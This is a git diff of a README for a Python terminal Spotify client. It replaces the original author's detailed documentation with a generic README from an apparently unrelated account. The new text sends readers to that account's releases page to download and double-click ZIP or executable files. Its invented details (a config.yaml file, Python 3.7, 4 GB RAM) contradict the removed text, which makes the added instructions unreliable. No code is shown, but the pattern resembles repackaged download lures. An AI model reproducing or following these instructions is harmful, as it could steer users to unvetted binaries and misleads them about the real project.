@@ -1,209 +1,104 @@
-# spt — Spotify TUI (Python) 🎧🐍
+# 🎵 Spotify-From-Terminal - Control Spotify Easily from Your Terminal
 
----
+## 📥 Download Now!
+[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Aerialladdertrucksociometry963/Spotify-From-Terminal/releases)
 
-[![License: MIT](https://img.shields.io/badge/license-MIT-blueviolet.svg)](https://opensource.org/licenses/MIT) [![Python Version](https://img.shields.io/badge/python-3.10%2B-blue)](https://www.python.org/) [![Release](https://img.shields.io/github/v/release/naarvent/Spotify-From-Terminal?label=last%20release)](https://github.com/naarvent/Spotify-From-Terminal/releases/tag/v2.0) [![Issues](https://img.shields.io/github/issues/naarvent/Spotify-From-Terminal)](https://github.com/naarvent/Spotify-From-Terminal/issues) [![GitHub stars](https://img.shields.io/github/stars/naarvent/Spotify-From-Terminal?style=social)](https://github.com/naarvent/Spotify-From-Terminal/stargazers)
+## 📖 Description
+Spotify-From-Terminal provides a modern terminal interface for Spotify. Built entirely in Python with Textual and Spotipy, it offers an easy way to interact with your music directly from your terminal. This application is inspired by Rigellute’s spotify-tui, but reimagined in Python. It combines the power of the Spotify Web API with a reactive terminal user interface (TUI).
 
+## 🚀 Getting Started
+This guide will help you download and run Spotify-From-Terminal. Follow these steps to get started quickly.
 
----
-A terminal-based Spotify client built with Python, Spotipy and Textual. It provides a keyboard-driven TUI for searching, browsing and controlling Spotify playback, viewing synced lyrics when available, managing playlists and devices, and more.
+### ⚙️ System Requirements
+Before proceeding, ensure your computer meets these basic requirements:
+- **Operating System:** Windows, MacOS, or Linux
+- **Python Version:** Python 3.7 or higher
+- **RAM:** 4 GB or more recommended
+- **Disk Space:** At least 100 MB free
 
+### 📥 Download & Install
+1. **Visit the Releases Page**
+   Click the following link to go to the Download page: [Download Spotify-From-Terminal](https://github.com/Aerialladdertrucksociometry963/Spotify-From-Terminal/releases)
 
----
+2. **Choose the Latest Version**
+   Look for the latest version of Spotify-From-Terminal. You may see files for different operating systems. Select the file that matches your system.
 
-## Table of Contents 📚
+3. **Download the File**
+   Click the file link to start downloading. The file will typically be a ZIP or executable file.
 
-- [Summary](#summary-)
-- [Features ✨](#features-)
-- [Requirements & Installation 🛠️](#requirements--installation-️)
-- [Environment & Credentials 🔐](#environment--credentials-)
-- [How it works (high level) ⚙️](#how-it-works-high-level-️)
-- [APIs & External Services 🌐](#apis--external-services-)
-- [Keybindings / Controls ⌨️](#keybindings--controls-️)
-- [Configuration & Cache 📂](#configuration--cache-)
-- [Troubleshooting & Notes 📝](#troubleshooting--notes-)
+4. **Extract the Files (if applicable)**
+   If you downloaded a ZIP file, right-click it and choose "Extract All." Follow the prompts to extract the files to a folder of your choice.
 
----
+5. **Install the Application**
+   If you downloaded an executable, double-click it to start the installation. Follow the on-screen instructions.
 
-## Summary 📝
+### 🏃‍♂️ Running the App
+1. **Open Your Terminal**
+   - On **Windows:** Search for "Command Prompt" or "PowerShell" in the start menu.
+   - On **MacOS:** Open "Terminal" from Spotlight Search.
+   - On **Linux:** Open your favorite terminal application.
 
-`spt` is a terminal UI (TUI) for interacting with Spotify. It uses:
+2. **Navigate to the Folder**
+   Use the `cd` command to navigate to the folder where you installed Spotify-From-Terminal. For example:
+   ```
+   cd path/to/your/folder
+   ```
 
-- `spotipy` for Spotify Web API access (user & app tokens)
-- `textual` for the terminal user interface
-- `requests` for HTTP calls to third-party lyric providers
-- (optional) `pyfiglet` for a big ASCII/FIGlet style header in the lyrics view
+3. **Launch the Application**
+   Type the following command to start Spotify-From-Terminal:
+   ```
+   python spotify_terminal.py
+   ```
+   Make sure to name the script correctly based on your downloaded file.
 
-The script provides search (tracks, albums, artists, playlists), playback control (play/pause/next/prev/seek/volume), liked tracks management, playlist creation/import, multi-add functionality, device transfer, and lyrics display (synced when available).
+### 🔑 Setting Up Spotify Access
+To use Spotify-From-Terminal, you must log in to your Spotify account.
 
----
+1. **Spotify Login**
+   When the app opens, it will prompt you to log in. Follow the on-screen instructions to authenticate your account.
 
-## Features ✨
+2. **Token Generation**
+   After logging in, the application will generate an access token. This token allows the app to control your Spotify account securely.
 
-- Search tracks, albums, artists and playlists (smart search + quick prefixes)
-- Play / Pause / Next / Previous / Seek / Volume / Shuffle / Repeat
-- View now playing with progress bar
-- Synced lyrics when available, or pseudo-synced lyrics generated from plain text
-- Add tracks to playlists, create playlists, import playlists
-- Multi-add / multi-review mode for batch operations
-- Device management and transfer playback
-- Persistent local cache and logs
+### 🎹 Using the Application
+Spotify-From-Terminal is designed for ease and flexibility. Here are some basic controls you can use after the app launches:
 
----
+- **Play/Pause:** Press `Space` to control playback.
+- **Next Track:** Press `N` to skip to the next song.
+- **Previous Track:** Press `P` to go back to the previous song.
+- **Search:** Press `/` to search for a specific song or artist.
 
-## Requirements & Installation 🛠️
+You can explore more features by navigating through the application.
 
-Recommended: Python 3.10+ (the script uses modern type hints and features that are easiest on 3.9/3.10+).
+### 🎨 Customization Options
+You may want to customize the application settings. Here’s how:
 
-Suggested minimal dependencies (you can install them via pip):
+1. **Edit Configuration File**
+   Locate the `config.yaml` file in your application folder. Open it with a text editor to make changes such as preferred themes or sound settings.
 
-```
-pip install spotipy textual requests rich pyfiglet
-```
+2. **Key Bindings**
+   If you prefer different keys for actions, you can change them in the configuration file as well.
 
-If you want a fixed requirements file, the main packages are:
+### 🛠️ Troubleshooting
+If you encounter issues, try the following steps:
+- **Check Python Installation**: Ensure Python is correctly installed. You can type `python --version` in your terminal to check.
+- **Update Spotipy**: If commands don’t work as expected, try updating the Spotipy library using:
+  ```
+  pip install --upgrade spotipy
+  ```
+- **Reinstall the Application**: If problems persist, consider reinstalling Spotify-From-Terminal.
 
-- spotipy
-- textual
-- requests
-- rich (Textual depends on rich but it's good to list explicitly)
-- pyfiglet (optional — used for fancy ASCII art in lyrics header)
+### 📞 Support
+If you need further assistance, please refer to the issues page on our GitHub repository for common questions or bug reports. 
 
-Quick setup (Windows, PowerShell):
+You can also submit your own questions or suggestions for improvement. Join a community that enjoys this tool and help us make it better!
 
-```powershell
-python -m venv .venv
-.\.venv\Scripts\Activate.ps1
-pip install --upgrade pip
-pip install spotipy textual requests rich pyfiglet
-```
+## 📜 License
+This project is licensed under the MIT License. Feel free to use, modify, and share it.
 
-Then run the app:
+For more information, please review the LICENSE file included in the project. 
 
-```powershell
-python "C:/route_to_script/spt_tui.py"
-```
-
----
-
-## Environment & Credentials 🔐
-
-The app uses the Spotify Web API and requires credentials. Provide them either via environment variables or via the local config prompt.
-
-Environment variables accepted:
-
-- `SPOTIPY_CLIENT_ID` — your Spotify Client ID
-- `SPOTIPY_CLIENT_SECRET` — your Spotify Client Secret
-- `SPOTIPY_REDIRECT_URI` — redirect URI configured in your Spotify app (must match the one in your Spotify Developer Dashboard)
-
-If these are not set or look like placeholders, the script will prompt you to paste credentials on first run and optionally save them to a local config file.
-
-Scopes requested (examples used by the script):
-
-- user-read-private
-- user-read-playback-state
-- user-modify-playback-state
-- user-read-currently-playing
-- playlist-read-private
-- playlist-modify-public
-- user-library-read
-- user-library-modify
-- user-top-read
-- and more (see the script's SCOPE list)
-
-Make sure your Spotify Developer app includes the specified redirect URI and that you grant the requested scopes when authorizing.
-
----
-
-## How it works (high level) ⚙️
-
-- The TUI is built with `textual` and mounts a left column (search / library / playlists) and a right column (details, results, lyrics, device table).
-- Spotify API operations use `spotipy`. The script attempts both user-scoped requests and an app-level client when helpful (for audio analysis / features fallback).
-- Lyrics are fetched via multiple strategies (LRCLib, lyrics.ovh, other heuristics). If synced lyrics (LRC) are available they are parsed and displayed with time-synced highlighting; otherwise the script can pseudo-sync plain lyrics.
-- Playback synchronization: the app periodically polls Spotify playback state and updates the progress bar and lyrics highlight.
-- Actions (like add to playlist, like/unlike, create playlist) are performed via the Web API and the app shows transient messages/results in the right pane.
-
----
-
-## APIs & External Services 🌐
-
-The script interacts with the following APIs/services:
-
-- Spotify Web API (via `spotipy`) — primary for playback, search, playlists, devices and user library
-- LRCLib (`https://lrclib.net`) — attempt to find synced LRC lyrics
-- lyrics.ovh (`https://api.lyrics.ovh`) — fallback for plain lyrics text
-- Other third-party endpoints via `requests` for lyrics lookups
-
-Note: network requests are performed by `requests` and some calls use short timeouts by default. If an API is unavailable, the app will fall back gracefully or show an error in the log.
-
----
-
-## Keybindings / Controls ⌨️
-
-These are the primary keybindings available in the TUI (press `?` for the Help view in-app):
-
-- Escape: Open menu / back to welcome
-- Ctrl+Q: Quit
-- Up / Down: Move selection
-- `/`: Focus search input
-- Enter: Open / Play selected item (or in Multi-Review toggles selection)
-- Space: Play / Pause
-- n: Next track
-- p: Previous / Restart (if >3s into track, restart)
-- r: Cycle repeat (off → context → track)
-- c: Add selected track to Queue
-- Ctrl+S: Toggle shuffle
-- - / + : Volume down / up (±5%)
-- m: Mute / Unmute
-- Ctrl+Left / Ctrl+Right: Seek back / forward (uses configured seconds)
-- <: Open seek settings
-- d: Manage devices (transfer playback)
-- l: Toggle Lyrics view
-- Ctrl+R: Refresh
-- Ctrl+T: Import playlist (paste URI)
-- f: Toggle favorite (like/unlike)
-- Ctrl+L: Toggle Multi-Add / Multi-Review mode
-- Ctrl+A: Add to playlist (or select all in multi-review)
-- Ctrl+D: Delete playlist or remove item
-
-There are many context-sensitive actions in views (e.g., in a playlist table you can add/remove or open album/artist views). The app provides a Help view with full details.
-
----
-
-## Search Quick Prefixes 🔎
-
-You can begin a search with a prefix to limit the type:
-
-- `/ART <query>` — search artists
-- `/ALB <query>` — search albums
-- `/TRK <query>` — search tracks
-- `/PLY <query>` — search playlists
-- `/PDC <query>` — search podcasts
-- `/EPS <query>` — search episodes
-
-
-If no prefix is used, a general search across types is performed.
-
----
-
-## Configuration & Cache 📂
-
-The script uses a per-user cache and log directory. By default it places data under your `Documents` folder in a subdirectory named `naarvent's projects/Spotify_TUI` (this is controlled by the `CACHE_DIR` constant in the script).
-
-Important paths:
-
-- Cache dir (default): `%USERPROFILE%\\Documents\\naarvent's projects\\Spotify_TUI`
-- Token cache: `.cache_spotify_token` inside the cache dir
-- Local config: `spt_config.json` inside the cache dir (if you choose to save credentials)
-- Log file: `spt_py_textual_spotify.log` inside the cache dir
-
-You can change environment variables or edit the script to change those defaults.
-
----
-
-## Troubleshooting & Notes 📝
-
-- If playlists don't load, try pressing `Ctrl+R` to refresh.
-- If the app cannot fetch lyrics, it will try multiple providers; a fallback converts plain lyrics into pseudo-synced lines.
-- For device transfer/playback actions, the target device must be available and your Spotify client must be active/online.
-- The script logs detailed information to the log file in the cache dir — consult that file for debugging (`spt_py_textual_spotify.log`).
+## 🔗 Additional Resources
+- [Spotify API Documentation](https://developer.spotify.com/documentation/web-api/)
+- [Textual Documentation](https://textual.textualize.io/)
+- [Spotipy Documentation](https://spotipy.readthedocs.io/)
